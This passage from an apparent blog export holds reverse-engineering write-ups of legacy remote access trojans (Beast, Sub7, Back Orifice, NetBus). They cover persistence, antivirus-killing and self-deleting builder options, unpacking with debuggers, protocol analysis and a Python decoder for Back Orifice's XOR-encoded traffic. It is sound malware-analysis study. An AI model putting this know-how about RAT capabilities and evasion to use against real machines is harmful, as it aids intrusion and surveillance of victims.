attackers decided to develop builder technique. BeastDoor reflects this transitional design. To avoid confusion, this article uses the terms: Payload: executable deployed on the victim machine Controller: attacker-side management application BeastDoor provides process injection capabilities and several builder options, including: Notifications Startup AV-FW Kill Misc Exe Icon Notifications are used to inform the attacker when a compromised machine comes online. Several terminologies used by Beast are now obsolete: SIN: Static IP Notification. Used for reverse connections; the host value refers to the attacker’s server. ICQ: Instant messaging service popular in the late 1990s. CGI: Common Gateway Interface. In early RATs, this often referred to an HTTP-based notification script. The Startup option allows the payload to modify registry entries or ActiveX-related settings to achieve persistence: The AV-FW Kill feature attempts to disable the Windows XP firewall and terminate specified antivirus processes: The Misc options provide additional execution behaviors. For example, the term “Melt” refers to deleting the original executable after execution. The payload copies itself to another directory, launches the replica, and terminates the original process. The Exe Icon option allows the attacker to change the payload’s icon to improve social engineering effectiveness. Once the payload is executed on the target machine, the controller displays the compromised host if the connection is successful. Protocol AnalysisUsing Wireshark, we can observe Beast 2.07’s network communication: Beast 2.07 uses plain text communication. Different C2 commands are identified using integer values. The first string received by the controller represents the username of the compromised machine (confirmed through reverse engineering). Reverse EngineeringPayload AnalysisBoth the payload and controller are written in Delphi: When analyzing the payload with Ghidra, I noticed that the Import Address Table appeared incomplete. Since a RAT payload is inherently a network application, the absence of APIs such as recv was suspicious. Ghidra provided the explanation: the binary was packed. Opening the file with PEView and ExeInfo confirmed that the payload was packed using UPX: When a PE file is packed with UPX, the original import table is compressed or removed and reconstructed dynamically at runtime. Therefore, static analysis tools initially display incomplete imports. If you are interest in how a normal application looks like in PEView.exe, please click hereIf you are interest in IAT, please click here After unpacking with:1&gt; upx.exe -d packed.exe -o unpacked.exe Reloading the unpacked binary in Ghidra restores the full import table. Installation ProcedureThe decompiled entry point reveals the installation logic: The payload modifies registry keys for persistence and then copies (or moves) itself to specific system directories: Notification Mechanism The notification function transmits victim information to the attacker using different communication mechanisms, depending on configuration. Main Function The main function contains logic that determines the role of the payload: Server mode: accepts incoming socket connections Client mode: connects back to the attacker As mentioned eariler, Beast uses integer values to distinguish C2 commands. The tool also leverages the ShowWindow Win32 API for features labeled as “Lamer Stuff” and “Fun Stuff”. These features inspired a similar feature in my own tool DuplexSpy Remote PluginAfter analyzing the protocol and reverse engineering the implementation, the plugin mechanism becomes clear: The controller sends a DLL as a byte array. The payload writes the DLL to disk. The payload dynamically loads the DLL using LoadLibraryA Captured traffic shows the MZ signature, confirming PE file transfer. Beast identifiers this feature using integer value 101, which equals 0x65 in hexadecimal: This plugin system is not fileless. Since the DLL is written to disk, modern antivirus software can detect this behavior. What’s more, plugins must be developed by the original author. Controller-Side AnalysisThe attacker-side application Beast2.07 is also packed. However, it was packed by ASPack instead of UPX: VulnerabilitiesPayloadWhen operating in server mode, the payload exposes a serious vulnerability in its plugin mechanism. Because the payload directly loads received DLL files using LoadLibraryA, an attacker could build a malicious DLL to achieve remote code execution or establish an alternative C2 channel (e.g., Meterpreter). Controller-SideBeast uses a plain-text protocol and trusts the first received string as machine identification. A simple Python script can send oversized data to the controller to trigger a denial-of-service condition: ConclusionBeast (BeastDoor) was a well-known (or notorious) remote access tool in the early 2000s. It represents a trasitional phase in offensive security techniques—shifting from direct connection models to reverse connection architectures. Although innovative for its time, it contains multiple vulnerabilities when evaluated under modern cybersecurity standards. Through this reverse engineering process, I gained valuable insights into: UPX packing ASPack protection Legacy RAT architecture design Reference 1. https://en.wikipedia.org/wiki/Beast_(Trojan_horse) &#8617; THANKS FOR READING","categories":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}],"tags":[{"name":"Studying","slug":"Studying","permalink":"https://iss4cf0ng.github.io/tags/Studying/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Malware","slug":"Malware","permalink":"https://iss4cf0ng.github.io/tags/Malware/"},{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/tags/Malware-Analysis/"},{"name":"Ghidra","slug":"Ghidra","permalink":"https://iss4cf0ng.github.io/tags/Ghidra/"},{"name":"Packing","slug":"Packing","permalink":"https://iss4cf0ng.github.io/tags/Packing/"},{"name":"Packed","slug":"Packed","permalink":"https://iss4cf0ng.github.io/tags/Packed/"},{"name":"Unpacking","slug":"Unpacking","permalink":"https://iss4cf0ng.github.io/tags/Unpacking/"},{"name":"Unpacked","slug":"Unpacked","permalink":"https://iss4cf0ng.github.io/tags/Unpacked/"},{"name":"PEView","slug":"PEView","permalink":"https://iss4cf0ng.github.io/tags/PEView/"},{"name":"PE File","slug":"PE-File","permalink":"https://iss4cf0ng.github.io/tags/PE-File/"},{"name":"Beast","slug":"Beast","permalink":"https://iss4cf0ng.github.io/tags/Beast/"},{"name":"BeastDoor","slug":"BeastDoor","permalink":"https://iss4cf0ng.github.io/tags/BeastDoor/"},{"name":"Beast RAT","slug":"Beast-RAT","permalink":"https://iss4cf0ng.github.io/tags/Beast-RAT/"}],"keywords":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}]},{"title":"[Studying] Analyzing Sub7 (SubSeven)","slug":"2026-2-18-Subseven","date":"2026-02-18T08:53:31.000Z","updated":"2026-02-27T15:26:26.939Z","comments":true,"path":"2026/02/18/2026-2-18-Subseven/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/18/2026-2-18-Subseven/","excerpt":"","text":"IntroductionThis article is part of my series: Inside Different Generations of RATs. If you are interested in the full series, please visit the linked page. Sub7Sub7 (SubSeven/Sub7Server) is a remote access trojan which was originally released in Februry 1999. Starting with version 2.1 (1999) it could be controlled via IRC. It works on the Windows 9x and Windows NT operating systems. Many versions were released over time. The latest release is version 2.3. In this article, I analyzed version 2.0, since it is the only ersion that functions properly in my test environment. Experimental EnvironmentTo safety conduct malware analysis, the environment should be isolated using virtual machines. Under no circumstances should malware be executed on a personal or production system. Tool Description ExeInfo Static analysis tool for examing PE file DIE (Detect It Easy) Static analysis tool for examing PE file CFF Explorer PE file editor and analyzer developed by NTCore, supporting 32-bit/64-bit executables and .NET assemblies UPX Executable packer/unpacker AsDie ASPack detection tool Wireshark Network protocol analyzer used to capture and inspect live or recorded traffic OllyDbg 32-bit user-mode debugger x32dbg 32-bit debugger Ghidra Open-source software reverse engineering framework developed by the NSA Device IP Address Description Windows XP 192.168.85.2 Victim machine used for executing both the controller and payload Windows 10 x64 (VM) 192.168.85.3 Analysis machine used for reverse engineering If you want to know how to set up your experimental enviroment, please view: How to Setup Your Experimental Environment for Malware Analysis Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17 UsageThe GUI of client (attacker-side) is illustrated below: Before we deploy the payload, we need to configure it. Launch EditServer.exe: Here, the term “Server” might be confusing from a modern perspective. In early-generation RATs, a “server” executable referred to the payload deployed on the victim machine, while a “client” referred to an application used for controlling the victim machines. As firewall technologies evolved and network security improved, attackers gradually shifted from direct connections to reverse connections. To avoid confusing, this article uses the terms: Controller: attacker-side application Payload: executable deployed on the victim machines Note that Sub7 2.3 provides Normal and Advanced configuration: Normal mode provides most of the commonly used options, while Advanced mode allows the use of a downloader and enables appending commands to the payload for execution during the initial deployment stage. The configuration wizard also provides persistence and plugin functionality: Here server.exe is the stub for building a payload. The principle is straightforward: the builder modifies server.exe and saves the result as a new executable file. After building the payload, deploy it on the target machine (Windows XP). Once you connected to the payload, you can see the message at the bottom of the GUI (commonly referred to as the StatusStrip in Windows application development): Protocol AnalysisThe communication channel is not encrypted. Data is transmitted in plain text: Reverse EngineeringUnpackingOpen Server.exe using ExeInfo and DIE (Detect It Easy): Both tools confirm that the payload was compiled by Object Pascal (Delphi) and packed by UPX. However, version 2.3 is packed by ASPack: Unpacking UPX and older version of ASPack is relatively easy nowadays, as many tools are publicly available… Well, the truth is: in my case, the UPX tool failed to unpack the payload: I tried UPX5.1.0 and UPX3.0, but encountered the same exception: CantUnpackException: this program is packed with an obsolete version and cannot be unpacked Therefore, I started learning how to manually unpack the payload using x32dbg (since this is a 32-bit PE file), OllyDbg and Scylla: Everything initially appeared successful. However, when I opened the unpacked payload with ExeInfo, it was still detected as UPX-packed. Additionally, TLS protection was present. After opening the file in Ghidra, the results confirmed this observation: If a payload is protected by TLS (Thread Local Storage), the dumped PE file may not function correctly. Therefore, I verified whether TLS protection was actually being used. To do so, we need to locate the TLS Directory. First, navigate to the entry point of the main module using the Memory Map in x32dbg: Next, right-click the main module and select Follow in Dump: The MZ signature of a PE file is visible. Then, locate the value of e_lfanew (PE header offset):1Address(e_lfanew) = BaseAddress + 0x3C The 4-byte result is: 00 01 00 00. Since the system uses little-endian format, the PE header offset is 0x0100. Therefore: 123456BaseAddress = 0x00400000PE Header Offset = 0x0100PE Header Address= 0x00400000 + 0x0100= 0x00400100 Navigate to this address in x32dbg: The data: 50 45 00 00 confirms the PE signature. Otherwise, the PE file might be damaged. Next, locate the DataDirectory:12PE signature size = 4 bytesIMAGE_FILE_HEADER size = 20 bytes 1234Address(IMAGE_OPTIONAL_HEADER)= 0x00400100 + (4 + 20)= 0x00400100 + 0x18= 0x00400118 1234DataDirectory= OptionalHeader + 0x60= 0x00400118 + 0x60= 0x00400178 Each directory entry occupies 8 bytes. The TLS directory is the 9-th entry. Therefore:1234TLS= 0x00400178 + (8 × 9)= 0x00400178 + 0x48= 0x004001C0 Notice that the value of AddressOfCallbacks is zero, indicating that no TLS callback is defined. Therefore, it is reasonable to assume that the TLS structure was added by Delphi by default. After further studying, I confirmed that the Import Address Table (IAT) of the dumped PE file was not properly fixed. Therefore, it needed to be repaired using Scylla. (Scylla also provides functionality for rebuilding the IAT after identifying the correct OEP.) The sections displayed in Program Trees were still incorrect. In this case, the payload can be modified using CFF Explorer: Note that the Raw Size should be adjusted to match the Virtual Size, and the SizeOfImage value must also be corrected: After performing these steps, the payload can be properly analyzed in Ghidra I also successfully unpacked version 2.3 payload, which is packed with ASPack. The unpacking method will be covered in a separate article. Message HandlerSince we already identified the plain text used for C2 communication during protocol analysis, we can locate the message handler using Ghidra. Originally, the function appears as follows in Ghidra:1void UndefinedFunction_004a6bf4(int *param_1,undefined4 param_2) In this case, navigate to the address 004a6bf4 in the Listing view and create a new function: Although the message handler looks quite complex at first glance, we can still understand its mechanism. Like the majority of RATs, it identifiers different C2 commands using integer values and responds accordingly to the controller. ConclusionThe most challenge part of this analysis was unpacking the payload. During this process, I could hardly find a tool for easily unpacking a payload packed with an obsolete version of UPX. After further investigation with x32dbg, I noticed that the payload was likely packed with UPX 0.72. ALthough manual unpacking was quite difficult for me as a begineer, I learned a great deal from the process. It also helped me successfully unpack with ASPack. Additionally, this exercise served as a valuable review of the PE file format. THANKS FOR READING","categories":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}],"tags":[{"name":"Studying","slug":"Studying","permalink":"https://iss4cf0ng.github.io/tags/Studying/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"OllyDbg","slug":"OllyDbg","permalink":"https://iss4cf0ng.github.io/tags/OllyDbg/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Malware","slug":"Malware","permalink":"https://iss4cf0ng.github.io/tags/Malware/"},{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/tags/Malware-Analysis/"},{"name":"Ghidra","slug":"Ghidra","permalink":"https://iss4cf0ng.github.io/tags/Ghidra/"},{"name":"Sub7","slug":"Sub7","permalink":"https://iss4cf0ng.github.io/tags/Sub7/"},{"name":"SubSeven","slug":"SubSeven","permalink":"https://iss4cf0ng.github.io/tags/SubSeven/"},{"name":"Sub7 RAT","slug":"Sub7-RAT","permalink":"https://iss4cf0ng.github.io/tags/Sub7-RAT/"},{"name":"SybSeven RAT","slug":"SybSeven-RAT","permalink":"https://iss4cf0ng.github.io/tags/SybSeven-RAT/"},{"name":"Packing","slug":"Packing","permalink":"https://iss4cf0ng.github.io/tags/Packing/"},{"name":"Packed","slug":"Packed","permalink":"https://iss4cf0ng.github.io/tags/Packed/"},{"name":"Unpacking","slug":"Unpacking","permalink":"https://iss4cf0ng.github.io/tags/Unpacking/"},{"name":"Unpacked","slug":"Unpacked","permalink":"https://iss4cf0ng.github.io/tags/Unpacked/"},{"name":"UPX","slug":"UPX","permalink":"https://iss4cf0ng.github.io/tags/UPX/"},{"name":"ASPack","slug":"ASPack","permalink":"https://iss4cf0ng.github.io/tags/ASPack/"},{"name":"Manually Unpacking","slug":"Manually-Unpacking","permalink":"https://iss4cf0ng.github.io/tags/Manually-Unpacking/"},{"name":"x32dbg","slug":"x32dbg","permalink":"https://iss4cf0ng.github.io/tags/x32dbg/"},{"name":"PEView","slug":"PEView","permalink":"https://iss4cf0ng.github.io/tags/PEView/"},{"name":"PE File","slug":"PE-File","permalink":"https://iss4cf0ng.github.io/tags/PE-File/"}],"keywords":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}]},{"title":"[Studying] Analyzing Back Orifice","slug":"2026-2-18-BackOrifice","date":"2026-02-18T08:53:07.000Z","updated":"2026-02-27T12:58:47.554Z","comments":true,"path":"2026/02/18/2026-2-18-BackOrifice/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/18/2026-2-18-BackOrifice/","excerpt":"","text":"IntroductionThis article is part of my series: Inside Different Generations of RATs. If you are interested in the full series, please refer to the linked article. Back OrificeBack Orifice (often shortened to BO) is a computer program designed for remote system administration. It enables a user to control a computer running the Microsoft Windows operating system from a remote location1. It was allegedly developed by a hacker group Cult of the Dead Cow in 1994 2. Cult of the Dead Cow (a.k.a cDc) is a computer hacker organization founded in 1984 in Lubbock, Texas 3. Back Orifice has a client-server (C/S) architecture. A small and unobtrusive server program is on one machine, which is remotely manipulated by a client program with a graphical user interface (GUI). Back Orifice has two famous versions——version 1.20 and version 2000——where the former one was released in 1998 and the latter one (here 2000 stands for Windows 2000) was released in 1999. There is also a version “v1.2.0.5”, which updates the graphical user interface. This article provides analysis of Back Orifice version 2000, since it is the most stable version. Experimental EnvironmentTo safely conduct malware analysis, the environment should be isolated using virtual machines. Under no circumstances should malware be executed on a personal or production system Tool Description ExeInfo A static analysis tool for examing PE fiel DIE (Detect It Easy) A static analysis tool for examing PE file Wireshark Network protocol analyzer used to capture and inspect live or recorded traffic Ghidra Open-source software reverse engineering framework developed by the NSA Device IP Address Description Windows XP x86 (VM) 192.168.85.2 Victim machine used for executing the Back Orifice client component Windows 10 x64 (VM) 192.168.85.3 Analyst machine used for reverse engineering and server-side interaction The two machines were configured within an isolated internal network to prevent unintended external communication. If you want to know how to set up your experimental enviroment, please view: How to Setup Your Experimental Environment for Malware Analysis Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17 Back Orifice 1.20The GUI of the client (attacker-side) is illustrated as follows: BackOrifice 1.20 (Well... I have no idea who this person is.) There are several files of this version: BO.txt: The documentation of Back Orifice plugin.txt: The plugin programming documentation boserve.exe: The Back Orifice self installing server (payload). bogui.exe: The Back Orifice gui client. boclient.exe: The Back Orifice next client. boconfig.exe: utility to configure exename, port, password, and default plugin for a BO server. melt.exe: Decompresses files compressed with the File freeze command. freeze.exe: Compresses files that can be decompressed with the File melt command. Here the terms “melt” and “freeze” might be confusing. Some other RATs use the term “melt” to indicate deleting the payload executable after it has been launched, while Back Orifice uses this term to represent decompressing files and uses “freeze” to represent compressing files. Back Orifice 2000The GUI of client (attacker-side) is illustrated as follow: To launch the payload, launch bo2kcfg.exe instead of `bo2k.exe: This GUI-based wizard allows the attacker to configure the payload. Here, the term “Server” might be confusing from a modern perspective. In early-generation RATs, a “server” executable referred to the payload deployed on the victim machine, while a “client” referred to an application used for controlling the victim machines. As firewall technologies evolved and network security improved, attackers gradually shifted from direct connections to reverse connections. To avoid confusing, this article uses the terms: Controller: attacker-side application Payload: executable deployed on the victim machines The payload configuration wizard allows the attacker to modify the parameter inside the given payload application: Here, I use port 60000 for the binding port of the payload. Next, launch the payload on the target machine (Windows XP). Start the controller application, navigate to the tool bar at the top. Select: File -&gt; New Server: Once you have connected successfully, you can see the following result: The “Server command client” allows the controller sends C2 commands to the payload. The mechanism works as follows: The controller sends C2 commands to the payload, the payload executes the corresponding funcitonallity and then return it. The controller receives the responses of the payload and displays them in the “Server Response” box. Protocol AnalysisBack Orifice officially provides XOR encoding and 3DES encryption for protecting the communication. As mentioned in the wizard, 3DES is only available on the US version of the product. However, I can hardly find the “US version” of this software. XORBack Orifice encodes the communication channel with a password string: Since this communication is encoded by XOR, I am going to demonstrate how to crack this channel with the method Known-Plaintext Attack. First, notice that Back Orifice provides messagebox prompt up feature, we can send two chunks of large data to the server: The result is shown as follow: For these two packets, notice that they have the same data 0x52, 0x00, 0x00, 0x00, 0x1c, 0x27, 0xaf, 0x8b as the prefix. Therefore, we can assume that this is the header or the C2 command for messagebox prompting. There are data chunks that appear frequently in both packets: 6a 75 2d 07 and 69 76 2e 04. Notice that (The SCLD course killed my passion of Boolean Algebra) : \\begin{align*} A \\oplus B = C \\implies A \\oplus C = B \\end{align*}Proof: \\begin{align*} \\because A \\oplus B = C \\implies A'B + AB' = C \\end{align*} \\begin{align*} \\therefore A \\oplus C &= A \\oplus (A'B + AB') \\\\ &= A'(A'B + AB') + A(A'B + AB')' \\\\ &= A'B + A((A + B')(A' + B)) \\\\ &= A'B + A(AB + A'B') \\\\ &= A'B + AB \\\\ &= B(A' + A) \\\\ &= B \\end{align*}The ASCII result of A and B in hexadecimal are 0x41 and 0x42 respectively. Next, perform XOR calculation: 0\\text{x}41 \\oplus 0\\text{x}6a = 0\\text{x}2b \\\\ 0\\text{x}41 \\oplus 0\\text{x}75 = 0\\text{x}34 \\\\ 0\\text{x}41 \\oplus 0\\text{x}2d = 0\\text{x}6c \\\\ 0\\text{x}41 \\oplus 0\\text{x}07 = 0\\text{x}46Therefore, the result is 2b 34 6c 46. Notice that this value appears in the packet: This strongly implies that the repeating 4-byte sequence serves as the XOR key used to encode the communication. Now, we can write a Python script for decoding the packets:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&#x27;&#x27;&#x27;Acknowledgement: https://github.com/iss4cf0ng/&#x27;&#x27;&#x27;import collectionsdef decoder(packet): # Frequency Analysis payload = packet[8:] chunks = [] for i in range(0, len(payload) - 3, 4): chunks.append(tuple(payload[i:i + 4])) most_common = collections.Counter(chunks).most_common(1) if not most_common: print(&#x27;[-] Cannot detect the valid key for decoding.&#x27;) return abKey = list(most_common[0][0]) key_hex = &#x27; &#x27;.join(f&#x27;&#123;b:02x&#125;&#x27; for b in abKey) print(f&#x27;[+] Detected key: &#123;key_hex&#125;&#x27;) header = packet[:8] data = list(header) for i in range(len(payload)): data.append(payload[i] ^ abKey[i % 4]) # Hexdump print(&#x27;-&#x27; * 50) for i in range(0, len(data), 16): chunk = data[i:i+16] offset = f&quot;&#123;i:04x&#125;&quot; hex_part = &quot; &quot;.join(f&quot;&#123;b:02x&#125;&quot; for b in chunk) if len(chunk) &gt; 8: hex_part = hex_part[:23] + &quot; &quot; + hex_part[24:] ascii_part = &quot;&quot;.join(chr(b) if 32 &lt;= b &lt;= 126 else &quot;.&quot; for b in chunk) print(f&quot;&#123;offset&#125; &#123;hex_part:&lt;48&#125; |&#123;ascii_part&#125;|&quot;)packet = [ # Your packet]def main(): decoder(packet)if __name__ == &#x27;__main__&#x27;: main() Save the result from Wireshark into the Python script: Now we can decode the channel successfully:1$ python3 decoder.py Reverse EngineeringFirst, open the payload executable bok2.exe using ExeInfo and DIE (stands for Detect it Easy): Both tools indicate that it was compiled using Microsoft Visual C++. Next, open bok2.exe with Ghidra: One lesson I learned here is that the message handler of a payload written in VC++ appears like this in Ghidra: How does it work? FUN_0314b6f8 acts as a dispatcher function. The second parameter (e.g., FUN_0314xxxx) represents the function that executes the corresponding functionality of the payload. For example, let’s jump into the first one (FUN_03141e23): We can find the keyword “Ping”, which corresponds to the first feature provided in the controller GUI: The 7-th feature provided in the GUI wizard is keylogger, let’s jump into the 7-th function (FUN_031439ed): We can see the keyword “Key_logging”, which confirms my hypothesis. DefectWhile analyzing this RAT, I had struggled in several issues. The main issue was an incorrect payload configuration, which led to execution failure. The second issue is related to the “Single User” mechanism, which may lead to situations similar to a deadlock scenario in C++ concurrency programming. ConclusionThis article describes the architecture of an infamous remote access Back Orifice from the early 2000s. It provides multiple features for controlling a remote machine. Since it uses direct connections, it can be persumed that it was used for controlling a remote server rather than targeting random users on the internetwork. It also provides a GUI wizard for configuring the payload. It is a significant difference between it and the modern RATs. The principle of the configuration functionality is: Static patch, which means it directly modify the PE file. References 1. https://en.wikipedia.org/wiki/Back_Orifice &#8617; 2. https://en.wikipedia.org/wiki/Microsoft_BackOffice_Server &#8617; 3. https://en.wikipedia.org/wiki/Cult_of_the_Dead_Cow &#8617; THANKS FOR READING","categories":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}],"tags":[{"name":"Studying","slug":"Studying","permalink":"https://iss4cf0ng.github.io/tags/Studying/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Back Orifice","slug":"Back-Orifice","permalink":"https://iss4cf0ng.github.io/tags/Back-Orifice/"},{"name":"Malware","slug":"Malware","permalink":"https://iss4cf0ng.github.io/tags/Malware/"},{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/tags/Malware-Analysis/"}],"keywords":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}]},{"title":"[Studying] Analyzing Netbus","slug":"2026-2-18-Netbus","date":"2026-02-18T08:17:06.000Z","updated":"2026-02-26T07:07:26.166Z","comments":true,"path":"2026/02/18/2026-2-18-Netbus/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/18/2026-2-18-Netbus/","excerpt":"","text":"IntroductionThis article is part of my series: Inside Different Generations of RATs. If you are interested in the full series, please click the mentioned page. This article revisits a well-known RAT from the late 1990s and presents a reverse engineering analysis of its architecture and communication protocol. NetbusNetBus is a remote access tool (RAT) to control Microsoft Windows systems. It was created in 1998 and became controversial due to its potential use as a Trojan horse. NetBus was written in Delphi by Carl-Fredrik Neikter. It was in wide circulation before Back Orifice was released. In modern RAT architecture, the system typically consists of two components: a client and a server. In many contemporary C2 frameworks——such as Cobalt Strike, Armitage or United Rake——the architecture may involve multiple clients connecting to a C2 server. However, in the late 1990s, the “client” refers to the attacker-side controller application, while the “server” refers to the payload installed on the victim machine. In this article, the following versions are analyzed: NetBus 1.20 NetBus 1.53 NetBus 1.70 NetBus 2.0 Pro Experimental Environment SetupTo safely conduct malware analysis, the environment should be isolated using virtual machines. Under no circumstances should malware be executed on a personal or production system. Tool Description PETool Utility for inspecting and modifying Portable Executable (PE) files, including EXE and DLL modules Process Explorer Advanced process monitoring tool for examining running processes, loaded DLLs, and system handles PEView Static analysis tool for examining PE and COFF file structures (EXE, DLL, OBJ, LIB) CFF Explorer PE file editor and analyzer developed by NTCore, supporting 32-bit/64-bit executables and .NET assemblies Wireshark Network protocol analyzer used to capture and inspect live or recorded traffic Ghidra Open-source software reverse engineering framework developed by the NSA Device IP Address Description Windows XP x86 (VM) 192.168.85.2 Victim machine used for executing the NetBus server component Windows 10 x64 (VM) 192.168.85.3 Analyst machine used for reverse engineering and client-side interaction The two virtual machines were configured within an isolated internal network to prevent unintended external communication. If you want to know how to set up your experimental enviroment, please view: How to Setup Your Experimental Environment for Malware Analysis Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17 NetBus 1.20File tree:12345└───Netbus1.20 KeyHook.dll //A DLL file, use with SysEdit.exe NetBus.exe //Client, controller NetBus.rtf //The README documentation SysEdit.exe //Server, payload Features in this version: Open/close the CD-ROM once. Open/close the CD-ROM in intervals, the time interval is set in seconds. Show optional image. The image must exist in the same directory as SysEdit. The supported image-formats is BMP and JPG. Swap mouse buttons – the right mouse button gets the left mouse button’s functions and vice versa. Start optional application. Play optional sound-file. The sound-file must exist in the same directory as SysEdit. The supported sound-format is WAV. Point the mouse to optional coordinates. You can even navigate the mouse on the target computer with your own! Show a message or question on the screen. Sentence that ends with ”?” gives a question, and a sentence that starts with ”?” gives a dialog-box that the user can give his ”answer” in. The answer is always sent back to you! Exit Windows. Go to an optional URL within a web-browser. Send keystrokes to the active application on the target computer! The text in the field ”Message/text” will be inserted in the application that has focus. (”|” represents enter). Listen for keystrokes and send them back to you! Get a screendump! (should not be used over slow connections) Inform yourself about which user-name the person has logged in with. Increase and decrease the sound-volume. Let’s attempt to execute NetBus.exe on a Windows 10 system: A VCL Forms application compiled with Delphi is a native Win32 executable built on top of the Win32 API. This explains why a GUI application developed decades ago can still execute on modern Windows 10 systems. This behavior is expected. However, some features may no longer function correctly due to changes in Windows system architecture and security configuration over time. The officially supported operating systems at the time included: Windows 95 Windows 98 Windows ME Windows NT 4.0 Now let’s take a look at the user interface. In version 1.20, only basic features are available. Some functions no longer operate correctly on modern systems. Overal, this version contains simple features. It does not involve modern features, such as file manager (but version 1.70 does). Next, execute SysEdit.exe on Windows XP machine, When executed on a Windows XP system, SysEdit.exe binds to TCP ports 12345 and 12346 to listen for incoming connections. These port numbers appear to be hardcoded and cannot be modified through the interface in this version.1&gt; netstat ano | find &quot;12345&quot; No firewall warning dialog is triggered on a Windows XP x64 system. Analyze the ProtocolWireshark filter:1ip.src == 10.98.217.130 || ip.dst == 10.98.217.130 After connecting to the server (SysEdit.exe): After TCP handshake, the server notifies the client using a plain text Netbus\\r. The structure of the C2 commands is shown below: Port 12345 is used for receiving C2 commands, while port 12346 is dedicated to the “Screen Dump” functionality. The result of ScreenDump——an image——is saved as temp2.jpg NetBus 1.53Version 1.53 introduces additional features: New features (Reference: README.txt of this version): Upload any file from you to the target computer! With this feature it will be possible to remotely update SysEdit with a new version. Record sounds that the microphone catch. The sound is sent back to you! Make click sounds every time a key is pressed! Download any file from the target. Before you start to download you can select files in a nice view that represents the harddisks on the target! NetBus 1.70This version contains more features, such as file manager: NetBus 2.0Starting from version 2.0, NetBus evolved into a more comprehensive system management application. Both the client and server components require installation and provide GUI-based interfaces. This version introduces features that are commonly seen in modern RATs, such as: Port forwarding Screen capture Camera capture Registry management Plugin management NetBus 2.0 uses a different protocol: Compared to the 1.x versions, NetBus 2.0 (and 2.1) implements encoded communication within its protocol. Reverse EngineeringNetbus 1.20Open SysEdit.exe (version: 1.20) using CFF Explorer. The executable is identified as a 32-bit x64 PE file. Both SysEdit.exe and KeyHook.dll were developed using Delphi. I have previously learned how to use Ghidra and IDA; however, I have not extensively performed malware analysis before. This makes the analysis of this legacy RAT a valuable practical exercise! Entry Point: No any patch is found: Imports: This application imports libraries like GDI32.dll, USER32.DLL, which demonstrate that it is a WinGUI application——Delphi VCL. To locate the WinMain entry point in a Delphi application using Ghidra is relatively straightforward once the Windows GUI execution model is understood. Unlike console applications, Win32 GUI applications enter a message loop and process window message via Win32 APIs such as GetMessage (or PeekMessage) and DispatchMessage. By examining references to DispatchMessageA in the import table and tracing its cross-references, we can identify the function responsible for initializing the application. Right-click -&gt; Show Reference To: Right-click -&gt; Show References to DispatchMessageA: Now, we can see a function like this: We can also use Show Call Tree to find this function. Now let’s click into FUN_0042c930: The function signature matches the standard Windows definition:123456int PASCAL WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow) This is how we find the WinMain() function. To identify the C2 command handler, we can trace calls to the recv function, which is responsible for receving data from the attacker. After stepping through each function within this call chain, the message handler is not immediately visible. In this case, go to the parent function which call FUN_00439b10 using Function Call Tree: From the decompiled code, it can be inferred that local_c stores the pointer to the received buffer. This is the reason why we cannot see any return value relate to the buffer. Let’s go into FUN_00403ac4: We can see that the buffer is now in puVar2. Let’s step into FUN_004026a8: By continuing to trace the execution flow, we eventually located the function responsible for handling incoming commands. An alternative approach is to search for know C2 command strings within the Defined Data section. Since NetBus 1.x uses plain-text commands, locating the handler becomes significantly easier. In contrast, modern RATs typically employ encrypted C2 channels, which significantly increases the complexity of reverse engineering. We can also use Immunity Debugger(or OllyDbg) to find the message handler: The KeyHook.dll module implements keylogging functionality. The KeyboardProc callback captures keystrokes, processes them, and transmits the recorded data (key char) back to the attacker. NetBus 2.0Tracing the TCP handler in NetBus 2.0 reveals a more structured design compared to version 1.x. By continuing to trace the execution flow, the message handler (FUN_0046e2c8) can be identified. Here, param_2 contains the pointer to the received buffer. Compare to version 1.x, NetBus 2.0 and 2.1 introduce significant improvements to the communication protocol. A structed protocol is defined to parse imcoming data. Instead of identifying C2 commands using plain-text string, version 2.0 uses integer identifiers to represent command types. The authentication function(uVar1 == 5): Other C2 commands follow the same protocol structure. ConclusionOne of the characteristics that contributed to the controversial nature of NetBus was its silent execution. Starting from version 2.0, the server component required installation through a GUI-based installer, shifting its presentation closer to that of a remote administration tool. From a technical perspective, NetBus 2.0 (and 2.1) represented a significant architectural evolution for its time. It introduced structed protocol handling, plugin-like extensibility, and graphical management features that resemble capabilities found in later-generation RATs. This article marks the beginning of this series and also my first attempt at conducting malware analysis using Ghidra. As this is an early work, some parts of the analysis may not be as refined as they could be. Any feedback or suggestions are highly appreciated! THANKS FOR 